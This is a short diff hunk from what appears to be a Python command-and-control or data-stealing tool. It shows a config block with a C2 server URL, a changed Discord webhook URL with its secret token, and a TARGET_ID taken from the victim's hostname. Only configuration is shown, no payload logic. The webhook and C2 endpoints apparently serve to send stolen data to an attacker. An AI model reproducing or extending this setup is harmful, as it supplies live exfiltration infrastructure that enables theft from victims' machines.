@@ -17,7 +17,7 @@ from io import BytesIO
 
 # ===== CONFIG =====
 C2_URL = "https://c2-receiver.onrender.com"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543840098548846643/Nl_mYva2hVTQW3B9mriAFdLJzzFl5ng_lLTvv0_pv8kBv-J9QOmu64DE7ZrleN7PMZEl"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1544224233276579872/XFiJVslsBwOd8idd1lIXXTJ8da0RCC2FeCx_bvxuahl4dkHCplawz15dnhMpcAxJ3iUA"
 # ==================
 
 TARGET_ID = socket.gethostname()
